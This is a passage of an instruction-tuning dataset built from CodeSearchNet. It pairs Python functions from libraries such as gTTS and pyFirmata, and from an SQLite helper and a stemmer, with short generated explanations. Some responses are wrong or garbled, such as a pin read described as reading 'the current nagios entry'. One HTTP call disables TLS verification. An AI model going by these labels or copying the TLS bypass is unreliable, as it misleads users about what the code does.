14478.4, 14515.7, 14554.9, 14602.5, 14646.4,\n                     14695.4, 14746.6, 14807.4, 14874.4, 14923.3, 14988.7,\n                     15054.1, 15121.7, 15184.2, 15239.3, 15288.9, 15346.2,\n                     15393.5, 15439.0, 15483.5, 15531.5, 15579.4, 15628.5,\n                     15677.3, 15736.7, 15788.3, 15839.7, 15900.6, 15961.5,\n                     16018.3, 16076.9, 16139.0, 16203.0, 16263.3, 16327.9,\n                     16398.9, 16478.3, 16538.2, 16621.6, 16697.0, 16777.2,\n                     16833.1, 16891.6, 16956.8, 17026.3, 17085.4, 17106.9,\n                     17169.4, 17239.4, 17292.0, 17354.2, 17414.2, 17447.3,\n                     17482.6, 17526.0, 17568.7, 17627.1, 17661.5])\n\n    if as_series:\n        return pd.Series(rslt)\n    return rslt"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ninitializes the table with the given schemaDef.", "response": "def _initTable(self, tableName, schemaDef):\n        cursor=_conn.execute(\"\"\"\n            SELECT * FROM sqlite_master WHERE name ='{0}' and type='table';\n        \"\"\".format(tableName))\n        if cursor.fetchone() is None:\n            _conn.execute('''CREATE TABLE {0} ({1});'''.format(tableName, schemaDef))\n            print(\"Table {0} created successfully\".format(tableName))\n        '''\n        else:\n            print(\"Deleting table\")\n            _conn.execute(\"\"\"DROP TABLE {0}\"\"\".format(tableName))\n        '''\n        cursor.close()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef display_with_id(self, obj, display_id, update=False):\n        ip = get_ipython()\n        if hasattr(ip, \"kernel\"):\n            data, md = ip.display_formatter.format(obj)\n            content = {\n                'data': data,\n                'metadata': md,\n                'transient': {'display_id': display_id},\n            }\n            msg_type = 'update_display_data' if update else 'display_data'\n            ip.kernel.session.send(ip.kernel.iopub_socket, msg_type, content, parent=ip.parent_header)\n        else:\n            display(obj)", "response": "Create a new display with an id"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_caller_text(frame):\n    def find_match_node(node):\n        \"Find a candidate ast node\"\n        match_node = None\n        for chd in ast.iter_child_nodes(node):\n            if getattr(chd, \"lineno\", 0) > frame.f_back.f_lineno:\n                break\n            match_node = node if isinstance(chd, ast.Name) and isinstance(node, ast.Call) else match_node\n            match_node = find_match_node(chd) or match_node\n        return match_node\n    lines, _ = inspect.findsource(frame.f_back.f_code)\n    match_node = find_match_node(ast.parse(\"\".join(lines)))\n    return unparse(match_node).strip().replace(', ', ',') if match_node is not None else None", "response": "Return the expression that calls the frame"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef parse_function_call(expression):\n    class Walker(ast.NodeVisitor):\n        \"ast NodeVisition helper class\"\n        def __init__(self):\n            self.results = {'func': None, 'args': [], 'kwargs': {}}\n\n        def resolveName(self, node):\n            if isinstance(node, ast.Name):\n                self.results['func'] += node.id\n            elif isinstance(node, ast.Attribute):\n                self.resolveName(node.value)\n                self.results['func'] += \".\" + node.attr\n\n        def visit_Call(self, node):\n            \"Visit the first call function\"\n            if self.results['func'] is not None:\n                return\n            self.results['func'] = \"\"\n            self.resolveName(node.func)\n            self.results['args'] = [unparse(arg).strip() for arg in node.args]\n            self.results['kwargs'] = {kw.arg:unparse(kw.value).strip().strip('\\'\"') for kw in node.keywords}\n\n    walker = Walker()\n    walker.visit(ast.parse(expression))\n    return walker.results", "response": "Parse an expression looking for a function call and return a dictionary with function name args and kwargs"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_matches_lineno(code, fn_name):\n    \"Return a list of line number corresponding to the definition of function with the name fn_name\"\n    class Walker(ast.NodeVisitor):\n        def __init__(self):\n            self._hits = set()\n\n        #pylint: disable=E0213,E1102    \n        def onvisit(fn):\n            def wrap(self, node):\n                fn(self,node)\n                super(Walker, self).generic_visit(node)\n            return wrap\n        \n        @onvisit\n        def visit_FunctionDef(self, node):\n            if node.name == fn_name:\n                self._hits.add(node)\n            return node\n        \n        @property\n        def hits(self):\n            return list(sorted([n.lineno + 1 for n in self._hits]))\n    \n    walker = Walker()\n    walker.visit(ast.parse(code))\n    return walker.hits", "response": "Return a list of line number corresponding to the definition of function with the name fn_name"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef tts_langs():\n    try:\n        langs = dict()\n        langs.update(_fetch_langs())\n        langs.update(_extra_langs())\n        log.debug(\"langs: %s\", langs)\n        return langs\n    except Exception as e:\n        raise RuntimeError(\"Unable to get language list: %s\" % str(e))", "response": "Returns a dictionary of languages Google Text - to - Speech supports."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nfetching languages from Google Translate and build a dictionary of languages that can be spoken.", "response": "def _fetch_langs():\n    \"\"\"Fetch (scrape) languages from Google Translate.\n\n    Google Translate loads a JavaScript Array of 'languages codes' that can\n    be spoken. We intersect this list with all the languages Google Translate\n    provides to get the ones that support text-to-speech.\n\n    Returns:\n        dict: A dictionnary of languages from Google Translate\n\n    \"\"\"\n    # Load HTML\n    page = requests.get(URL_BASE)\n    soup = BeautifulSoup(page.content, 'html.parser')\n\n    # JavaScript URL\n    # The <script src=''> path can change, but not the file.\n    # Ex: /zyx/abc/20180211/desktop_module_main.js\n    js_path = soup.find(src=re.compile(JS_FILE))['src']\n    js_url = \"{}/{}\".format(URL_BASE, js_path)\n\n    # Load JavaScript\n    js_contents = requests.get(js_url).text\n\n    # Approximately extract TTS-enabled language codes\n    # RegEx pattern search because minified variables can change.\n    # Extra garbage will be dealt with later as we keep languages only.\n    # In: \"[...]Fv={af:1,ar:1,[...],zh:1,\"zh-cn\":1,\"zh-tw\":1}[...]\"\n    # Out: ['is', '12', [...], 'af', 'ar', [...], 'zh', 'zh-cn', 'zh-tw']\n    pattern = r'[{,\\\"](\\w{2}|\\w{2}-\\w{2,3})(?=:1|\\\":1)'\n    tts_langs = re.findall(pattern, js_contents)\n\n    # Build lang. dict. from main page (JavaScript object populating lang. menu)\n    # Filtering with the TTS-enabled languages\n    # In: \"{code:'auto',name:'Detect language'},{code:'af',name:'Afrikaans'},[...]\"\n    # re.findall: [('auto', 'Detect language'), ('af', 'Afrikaans'), [...]]\n    # Out: {'af': 'Afrikaans', [...]}\n    trans_pattern = r\"{code:'(?P<lang>.+?[^'])',name:'(?P<name>.+?[^'])'}\"\n    trans_langs = re.findall(trans_pattern, page.text)\n    return {lang: name for lang, name in trans_langs if lang in tts_langs}"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nadd a space after a tone - modifying punctuation.", "response": "def tone_marks(text):\n    \"\"\"Add a space after tone-modifying punctuation.\n\n    Because the `tone_marks` tokenizer case will split after a tone-modidfying\n    punctuation mark, make sure there's whitespace after.\n\n    \"\"\"\n    return PreProcessorRegex(\n        search_args=symbols.TONE_MARKS,\n        search_func=lambda x: u\"(?<={})\".format(x),\n        repl=' ').run(text)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreform words cut by end - of - line hyphens Remove <newline >.", "response": "def end_of_line(text):\n    \"\"\"Re-form words cut by end-of-line hyphens.\n\n    Remove \"<hyphen><newline>\".\n\n    \"\"\"\n    return PreProcessorRegex(\n        search_args=u'-',\n        search_func=lambda x: u\"{}\\n\".format(x),\n        repl='').run(text)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef abbreviations(text):\n    return PreProcessorRegex(\n        search_args=symbols.ABBREVIATIONS,\n        search_func=lambda x: r\"(?<={})(?=\\.).\".format(x),\n        repl='', flags=re.IGNORECASE).run(text)", "response": "Remove periods after an abbreviation from a list of known\n    abbrevations that can be spoken the same without that period."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nkeep tone - modifying punctuation by matching following character.", "response": "def tone_marks():\n    \"\"\"Keep tone-modifying punctuation by matching following character.\n\n    Assumes the `tone_marks` pre-processor was run for cases where there might\n    not be any space after a tone-modifying punctuation mark.\n    \"\"\"\n    return RegexBuilder(\n        pattern_args=symbols.TONE_MARKS,\n        pattern_func=lambda x: u\"(?<={}).\".format(x)).regex"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef period_comma():\n    return RegexBuilder(\n        pattern_args=symbols.PERIOD_COMMA,\n        pattern_func=lambda x: r\"(?<!\\.[a-z]){} \".format(x)).regex", "response": "Period and comma case."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef colon():\n    return RegexBuilder(\n        pattern_args=symbols.COLON,\n        pattern_func=lambda x: r\"(?<!\\d){}\".format(x)).regex", "response": "Colon case.\n Match a colon only if not preceeded by a digit."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nmatch other punctuation that naturally contains a break in speech.", "response": "def other_punctuation():\n    \"\"\"Match other punctuation.\n\n    Match other punctuation to split on; punctuation that naturally\n    inserts a break in speech.\n\n    \"\"\"\n    punc = ''.join(\n        set(symbols.ALL_PUNC) -\n        set(symbols.TONE_MARKS) -\n        set(symbols.PERIOD_COMMA) -\n        set(symbols.COLON))\n    return RegexBuilder(\n        pattern_args=punc,\n        pattern_func=lambda x: u\"{}\".format(x)).regex"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nmatch all punctuation. Use as only tokenizer case to mimic gTTS 1.x tokenization.", "response": "def legacy_all_punctuation():  # pragma: no cover b/c tested but Coveralls: \u00af\\_(\u30c4)_/\u00af\n    \"\"\"Match all punctuation.\n\n    Use as only tokenizer case to mimic gTTS 1.x tokenization.\n    \"\"\"\n    punc = symbols.ALL_PUNC\n    return RegexBuilder(\n        pattern_args=punc,\n        pattern_func=lambda x: u\"{}\".format(x)).regex"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nvalidating the text argument.", "response": "def validate_text(ctx, param, text):\n    \"\"\"Validation callback for the <text> argument.\n    Ensures <text> (arg) and <file> (opt) are mutually exclusive\n    \"\"\"\n    if not text and 'file' not in ctx.params:\n        # No <text> and no <file>\n        raise click.BadParameter(\n            \"<text> or -f/--file <file> required\")\n    if text and 'file' in ctx.params:\n        # Both <text> and <file>\n        raise click.BadParameter(\n            \"<text> and -f/--file <file> can't be used together\")\n    return text"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef validate_lang(ctx, param, lang):\n    if ctx.params['nocheck']:\n        return lang\n\n    try:\n        if lang not in tts_langs():\n            raise click.UsageError(\n                \"'%s' not in list of supported languages.\\n\"\n                \"Use --all to list languages or \"\n                \"add --nocheck to disable language check.\" % lang)\n        else:\n            # The language is valid.\n            # No need to let gTTS re-validate.\n            ctx.params['nocheck'] = True\n    except RuntimeError as e:\n        # Only case where the <nocheck> flag can be False\n        # Non-fatal. gTTS will try to re-validate.\n        log.debug(str(e), exc_info=True)\n\n    return lang", "response": "Validate the language of the current language."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef print_languages(ctx, param, value):\n    if not value or ctx.resilient_parsing:\n        return\n    try:\n        langs = tts_langs()\n        langs_str_list = sorted(\"{}: {}\".format(k, langs[k]) for k in langs)\n        click.echo('  ' + '\\n  '.join(langs_str_list))\n    except RuntimeError as e:  # pragma: no cover\n        log.debug(str(e), exc_info=True)\n        raise click.ClickException(\"Couldn't fetch language list.\")\n    ctx.exit()", "response": "Callback for all flag. Prints formatted sorted list of supported languages and exits\n   "}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef tts_cli(text, file, output, slow, lang, nocheck):\n\n    # stdin for <text>\n    if text == '-':\n        text = click.get_text_stream('stdin').read()\n\n    # stdout (when no <output>)\n    if not output:\n        output = click.get_binary_stream('stdout')\n\n    # <file> input (stdin on '-' is handled by click.File)\n    if file:\n        try:\n            text = file.read()\n        except UnicodeDecodeError as e:  # pragma: no cover\n            log.debug(str(e), exc_info=True)\n            raise click.FileError(\n                file.name,\n                \"<file> must be encoded using '%s'.\" %\n                sys_encoding())\n\n    # TTS\n    try:\n        tts = gTTS(\n            text=text,\n            lang=lang,\n            slow=slow,\n            lang_check=not nocheck)\n        tts.write_to_fp(output)\n    except (ValueError, AssertionError) as e:\n        raise click.UsageError(str(e))\n    except gTTSError as e:\n        raise click.ClickException(str(e))", "response": "Read text to mp3 format using Google Translate s Text - to - Speech API."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nwrite the bytes to a file - like object.", "response": "def write_to_fp(self, fp):\n        \"\"\"Do the TTS API request and write bytes to a file-like object.\n\n        Args:\n            fp (file object): Any file-like object to write the ``mp3`` to.\n\n        Raises:\n            :class:`gTTSError`: When there's an error with the API request.\n            TypeError: When ``fp`` is not a file-like object that takes bytes.\n\n        \"\"\"\n        # When disabling ssl verify in requests (for proxies and firewalls),\n        # urllib3 prints an insecure warning on stdout. We disable that.\n        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\n        text_parts = self._tokenize(self.text)\n        log.debug(\"text_parts: %i\", len(text_parts))\n        assert text_parts, 'No text to send to TTS API'\n\n        for idx, part in enumerate(text_parts):\n            try:\n                # Calculate token\n                part_tk = self.token.calculate_token(part)\n            except requests.exceptions.RequestException as e:  # pragma: no cover\n                log.debug(str(e), exc_info=True)\n                raise gTTSError(\n                    \"Connection error during token calculation: %s\" %\n                    str(e))\n\n            payload = {'ie': 'UTF-8',\n                       'q': part,\n                       'tl': self.lang,\n                       'ttsspeed': self.speed,\n                       'total': len(text_parts),\n                       'idx': idx,\n                       'client': 'tw-ob',\n                       'textlen': _len(part),\n                       'tk': part_tk}\n\n            log.debug(\"payload-%i: %s\", idx, payload)\n\n            try:\n                # Request\n                r = requests.get(self.GOOGLE_TTS_URL,\n                                 params=payload,\n                                 headers=self.GOOGLE_TTS_HEADERS,\n                                 proxies=urllib.request.getproxies(),\n                                 verify=False)\n\n                log.debug(\"headers-%i: %s\", idx, r.request.headers)\n                log.debug(\"url-%i: %s\", idx, r.request.url)\n                log.debug(\"status-%i: %s\", idx, r.status_code)\n\n                r.raise_for_status()\n            except requests.exceptions.HTTPError:\n                # Request successful, bad response\n                raise gTTSError(tts=self, response=r)\n            except requests.exceptions.RequestException as e:  # pragma: no cover\n                # Request failed\n                raise gTTSError(str(e))\n\n            try:\n                # Write\n                for chunk in r.iter_content(chunk_size=1024):\n                    fp.write(chunk)\n                log.debug(\"part-%i written to %s\", idx, fp)\n            except (AttributeError, TypeError) as e:\n                raise TypeError(\n                    \"'fp' is not a file-like object or it does not take bytes: %s\" %\n                    str(e))"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nsaves the result of the TTS API request and write result to file.", "response": "def save(self, savefile):\n        \"\"\"Do the TTS API request and write result to file.\n\n        Args:\n            savefile (string): The path and file name to save the ``mp3`` to.\n\n        Raises:\n            :class:`gTTSError`: When there's an error with the API request.\n\n        \"\"\"\n        with open(str(savefile), 'wb') as f:\n            self.write_to_fp(f)\n            log.debug(\"Saved to %s\", savefile)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nattempting to guess what went wrong by using known information ( e. g. http response and observed behaviour", "response": "def infer_msg(self, tts, rsp):\n        \"\"\"Attempt to guess what went wrong by using known\n        information (e.g. http response) and observed behaviour\n\n        \"\"\"\n        # rsp should be <requests.Response>\n        # http://docs.python-requests.org/en/master/api/\n        status = rsp.status_code\n        reason = rsp.reason\n\n        cause = \"Unknown\"\n        if status == 403:\n            cause = \"Bad token or upstream API changes\"\n        elif status == 404 and not tts.lang_check:\n            cause = \"Unsupported language '%s'\" % self.tts.lang\n        elif status >= 500:\n            cause = \"Uptream API error. Try again later.\"\n\n        return \"%i (%s) from TTS API. Probable cause: %s\" % (\n            status, reason, cause)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nrun each regex substitution on text.", "response": "def run(self, text):\n        \"\"\"Run each regex substitution on ``text``.\n\n        Args:\n            text (string): the input text.\n\n        Returns:\n            string: text after all substitutions have been sequentially\n            applied.\n\n        \"\"\"\n        for regex in self.regexes:\n            text = regex.sub(self.repl, text)\n        return text"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nruns each substitution on text.", "response": "def run(self, text):\n        \"\"\"Run each substitution on ``text``.\n\n        Args:\n            text (string): the input text.\n\n        Returns:\n            string: text after all substitutions have been sequentially\n            applied.\n\n        \"\"\"\n        for pp in self.pre_processors:\n            text = pp.run(text)\n        return text"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ntrue iff b [ i ] is a consonant", "response": "def cons(self, i):\n        \"\"\" True iff b[i] is a consonant \"\"\"\n        if self.b[i] in 'aeiou':\n            return False\n        elif self.b[i] == 'y':\n            return True if i == 0 else not self.cons(i-1)\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ntrues iff 0... j contains vowel", "response": "def vowel_in_stem(self):\n        \"\"\" True iff 0...j contains vowel \"\"\"\n        for i in range(0, self.j+1):\n            if not self.cons(i):\n                return True\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ntruing iff j contains double consonant j - 1.", "response": "def doublec(self, j):\n        \"\"\" True iff j, j-1 contains double consonant \"\"\"\n        if j < 1 or self.b[j] != self.b[j-1]:\n            return False\n        return self.cons(j)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ntruing iff 0... k ends with string s", "response": "def ends(self, s):\n        length = len(s)\n        \"\"\" True iff 0...k ends with string s \"\"\"\n        res = (self.b[self.k-length+1:self.k+1] == s)\n        if res:\n            self.j = self.k - length\n        return res"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef setto(self, s):\n        length = len(s)\n        self.b[self.j+1:self.j+1+length] = s\n        self.k = self.j + length", "response": "set j + 1... k to string s readjusting k"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef step1c(self):\n        if self.ends(['y']) and self.vowel_in_stem():\n            self.b[self.k] = 'i'", "response": "turn terminal y into i if there s a vowel in stem"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef setup_layout(self, board_layout):\n        # Create pin instances based on board layout\n        self.analog = []\n        for i in board_layout['analog']:\n            self.analog.append(Pin(self, i))\n\n        self.digital = []\n        self.digital_ports = []\n        for i in range(0, len(board_layout['digital']), 8):\n            num_pins = len(board_layout['digital'][i:i + 8])\n            port_number = int(i / 8)\n            self.digital_ports.append(Port(self, port_number, num_pins))\n\n        # Allow to access the Pin instances directly\n        for port in self.digital_ports:\n            self.digital += port.pins\n\n        # Setup PWM pins\n        for i in board_layout['pwm']:\n            self.digital[i].PWM_CAPABLE = True\n\n        # Disable certain ports like Rx/Tx and crystal ports\n        for i in board_layout['disabled']:\n            self.digital[i].mode = UNAVAILABLE\n\n        # Create a dictionary of 'taken' pins. Used by the get_pin method\n        self.taken = {'analog': dict(map(lambda p: (p.pin_number, False), self.analog)),\n                      'digital': dict(map(lambda p: (p.pin_number, False), self.digital))}\n\n        self._set_default_handlers()", "response": "Setup the board layout."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef auto_setup(self):\n        self.add_cmd_handler(CAPABILITY_RESPONSE, self._handle_report_capability_response)\n        self.send_sysex(CAPABILITY_QUERY, [])\n        self.pass_time(0.1)  # Serial SYNC\n\n        while self.bytes_available():\n            self.iterate()\n\n        # handle_report_capability_response will write self._layout\n        if self._layout:\n            self.setup_layout(self._layout)\n        else:\n            raise IOError(\"Board detection failed.\")", "response": "Automatic setup based on Firmata s Capability Query"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nadds a command handler for a command.", "response": "def add_cmd_handler(self, cmd, func):\n        \"\"\"Adds a command handler for a command.\"\"\"\n        len_args = len(inspect.getargspec(func)[0])\n\n        def add_meta(f):\n            def decorator(*args, **kwargs):\n                f(*args, **kwargs)\n            decorator.bytes_needed = len_args - 1  # exclude self\n            decorator.__name__ = f.__name__\n            return decorator\n        func = add_meta(func)\n        self._command_handlers[cmd] = func"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_pin(self, pin_def):\n        if type(pin_def) == list:\n            bits = pin_def\n        else:\n            bits = pin_def.split(':')\n        a_d = bits[0] == 'a' and 'analog' or 'digital'\n        part = getattr(self, a_d)\n        pin_nr = int(bits[1])\n        if pin_nr >= len(part):\n            raise InvalidPinDefError('Invalid pin definition: {0} at position 3 on {1}'\n                                     .format(pin_def, self.name))\n        if getattr(part[pin_nr], 'mode', None) == UNAVAILABLE:\n            raise InvalidPinDefError('Invalid pin definition: '\n                                     'UNAVAILABLE pin {0} at position on {1}'\n                                     .format(pin_def, self.name))\n        if self.taken[a_d][pin_nr]:\n            raise PinAlreadyTakenError('{0} pin {1} is already taken on {2}'\n                                       .format(a_d, bits[1], self.name))\n        # ok, should be available\n        pin = part[pin_nr]\n        self.taken[a_d][pin_nr] = True\n        if pin.type is DIGITAL:\n            if bits[2] == 'p':\n                pin.mode = PWM\n            elif bits[2] == 's':\n                pin.mode = SERVO\n            elif bits[2] != 'o':\n                pin.mode = INPUT\n        else:\n            pin.enable_reporting()\n        return pin", "response": "Returns the activated pin given by the pin definition."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef pass_time(self, t):\n        cont = time.time() + t\n        while time.time() < cont:\n            time.sleep(0)", "response": "Non - blocking time - out for t seconds."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nsends a SysEx message.", "response": "def send_sysex(self, sysex_cmd, data):\n        \"\"\"\n        Sends a SysEx msg.\n\n        :arg sysex_cmd: A sysex command byte\n        : arg data: a bytearray of 7-bit bytes of arbitrary data\n        \"\"\"\n        msg = bytearray([START_SYSEX, sysex_cmd])\n        msg.extend(data)\n        msg.append(END_SYSEX)\n        self.sp.write(msg)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef iterate(self):\n        byte = self.sp.read()\n        if not byte:\n            return\n        data = ord(byte)\n        received_data = []\n        handler = None\n        if data < START_SYSEX:\n            # These commands can have 'channel data' like a pin nummber appended.\n            try:\n                handler = self._command_handlers[data & 0xF0]\n            except KeyError:\n                return\n            received_data.append(data & 0x0F)\n            while len(received_data) < handler.bytes_needed:\n                received_data.append(ord(self.sp.read()))\n        elif data == START_SYSEX:\n            data = ord(self.sp.read())\n            handler = self._command_handlers.get(data)\n            if not handler:\n                return\n            data = ord(self.sp.read())\n            while data != END_SYSEX:\n                received_data.append(data)\n                data = ord(self.sp.read())\n        else:\n            try:\n                handler = self._command_handlers[data]\n            except KeyError:\n                return\n            while len(received_data) < handler.bytes_needed:\n                received_data.append(ord(self.sp.read()))\n        # Handle the data\n        try:\n            handler(*received_data)\n        except ValueError:\n            pass", "response": "Reads and handles data from the microcontroller over the serial port."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef servo_config(self, pin, min_pulse=544, max_pulse=2400, angle=0):\n        if pin > len(self.digital) or self.digital[pin].mode == UNAVAILABLE:\n            raise IOError(\"Pin {0} is not a valid servo pin\".format(pin))\n\n        data = bytearray([pin])\n        data += to_two_bytes(min_pulse)\n        data += to_two_bytes(max_pulse)\n        self.send_sysex(SERVO_CONFIG, data)\n\n        # set pin._mode to SERVO so that it sends analog messages\n        # don't set pin.mode as that calls this method\n        self.digital[pin]._mode = SERVO\n        self.digital[pin].write(angle)", "response": "Configure a pin as servo."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncalling this to exit cleanly.", "response": "def exit(self):\n        \"\"\"Call this to exit cleanly.\"\"\"\n        # First detach all servo's, otherwise it somehow doesn't want to close...\n        if hasattr(self, 'digital'):\n            for pin in self.digital:\n                if pin.mode == SERVO:\n                    pin.mode = OUTPUT\n        if hasattr(self, 'sp'):\n            self.sp.close()"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _handle_digital_message(self, port_nr, lsb, msb):\n        mask = (msb << 7) + lsb\n        try:\n            self.digital_ports[port_nr]._update(mask)\n        except IndexError:\n            raise ValueError", "response": "Handle a digital message."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nenabling reporting of values for the whole port.", "response": "def enable_reporting(self):\n        \"\"\"Enable reporting of values for the whole port.\"\"\"\n        self.reporting = True\n        msg = bytearray([REPORT_DIGITAL + self.port_number, 1])\n        self.board.sp.write(msg)\n\n        for pin in self.pins:\n            if pin.mode == INPUT:\n                pin.reporting = True"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef disable_reporting(self):\n        self.reporting = False\n        msg = bytearray([REPORT_DIGITAL + self.port_number, 0])\n        self.board.sp.write(msg)", "response": "Disable the reporting of the port."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nwriting the output pins of the port to the correct state.", "response": "def write(self):\n        \"\"\"Set the output pins of the port to the correct state.\"\"\"\n        mask = 0\n        for pin in self.pins:\n            if pin.mode == OUTPUT:\n                if pin.value == 1:\n                    pin_nr = pin.pin_number - self.port_number * 8\n                    mask |= 1 << int(pin_nr)\n#        print(\"type mask\", type(mask))\n#        print(\"type self.portnumber\", type(self.port_number))\n#        print(\"type pinnr\", type(pin_nr))\n        msg = bytearray([DIGITAL_MESSAGE + self.port_number, mask % 128, mask >> 7])\n        self.board.sp.write(msg)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nupdating the values for the pins marked as input with the mask.", "response": "def _update(self, mask):\n        \"\"\"Update the values for the pins marked as input with the mask.\"\"\"\n        if self.reporting:\n            for pin in self.pins:\n                if pin.mode is INPUT:\n                    pin_nr = pin.pin_number - self.port_number * 8\n                    pin.value = (mask & (1 << pin_nr)) > 0"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef enable_reporting(self):\n        if self.mode is not INPUT:\n            raise IOError(\"{0} is not an input and can therefore not report\".format(self))\n        if self.type == ANALOG:\n            self.reporting = True\n            msg = bytearray([REPORT_ANALOG + self.pin_number, 1])\n            self.board.sp.write(msg)\n        else:\n            self.port.enable_reporting()", "response": "Enable reporting for an input pin."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ndisable the reporting of an input pin.", "response": "def disable_reporting(self):\n        \"\"\"Disable the reporting of an input pin.\"\"\"\n        if self.type == ANALOG:\n            self.reporting = False\n            msg = bytearray([REPORT_ANALOG + self.pin_number, 0])\n            self.board.sp.write(msg)\n        else:\n            self.port.disable_reporting()"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef read(self):\n        if self.mode == UNAVAILABLE:\n            raise IOError(\"Cannot read pin {0}\".format(self.__str__()))\n        return self.value", "response": "Reads the value of the current nagios entry."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nwrite a voltage from the pin to the board.", "response": "def write(self, value):\n        \"\"\"\n        Output a voltage from the pin\n\n        :arg value: Uses value as a boolean if the pin is in output mode, or\n            expects a float from 0 to 1 if the pin is in PWM mode. If the pin\n            is in SERVO the value should be in degrees.\n\n        \"\"\"\n        if self.mode is UNAVAILABLE:\n            raise IOError(\"{0} can not be used through Firmata\".format(self))\n        if self.mode is INPUT:\n            raise IOError(\"{0} is set up as an INPUT and can therefore not be written to\"\n                          .format(self))\n        if value is not self.value:\n            self.value = value\n            if self.mode is OUTPUT:\n                if self.port:\n                    self.port.write()\n                else:\n                    msg = bytearray([DIGITAL_MESSAGE, self.pin_number, value])\n                    self.board.sp.write(msg)\n            elif self.mode is PWM:\n                value = int(round(value * 255))\n                msg = bytearray([ANALOG_MESSAGE + self.pin_number, value % 128, value >> 7])\n                self.board.sp.write(msg)\n            elif self.mode is SERVO:\n                value = int(value)\n                msg = bytearray([ANALOG_MESSAGE + self.pin_number, value % 128, value >> 7])\n                self.board.sp.write(msg)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_the_board(\n    layout=BOARDS[\"arduino\"], base_dir=\"/dev/\", identifier=\"tty.usbserial\"\n):\n    \"\"\"\n    Helper function to get the one and only board connected to the computer\n    running this. It assumes a normal arduino layout, but this can be\n    overriden by passing a different layout dict as the ``layout`` parameter.\n    ``base_dir`` and ``identifier`` are overridable as well. It will raise an\n    IOError if it can't find a board, on a serial, or if it finds more than\n    one.\n    \"\"\"\n    from .pyfirmata import Board  # prevent a circular import\n\n    boards = []\n    for device in os.listdir(base_dir):\n        if device.startswith(identifier):\n            try:\n                board = Board(os.path.join(base_dir, device), layout)\n            except serial.SerialException:\n                pass\n            else:\n                boards.append(board)\n    if len(boards) == 0:\n        raise IOError(\n            \"No boards found in {0} with identifier {1}\".format(base_dir, identifier)\n        )\n    elif len(boards) > 1:\n        raise IOError(\"More than one board found!\")\n    return boards[0]", "response": "Helper function to get the board connected to the computer\n    running this."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nconverting a two 7 bit byte string to an integer.", "response": "def from_two_bytes(bytes):\n    \"\"\"\n    Return an integer from two 7 bit bytes.\n    \"\"\"\n    lsb, msb = bytes\n    try:\n        # Usually bytes have been converted to integers with ord already\n        return msb << 7 | lsb\n    except TypeError:\n        # But add this for easy testing\n        # One of them can be a string, or both\n        try:\n            lsb = ord(lsb)\n        except TypeError:\n            pass\n        try:\n            msb = ord(msb)\n        except TypeError:\n            pass\n        return msb << 7 | lsb"}
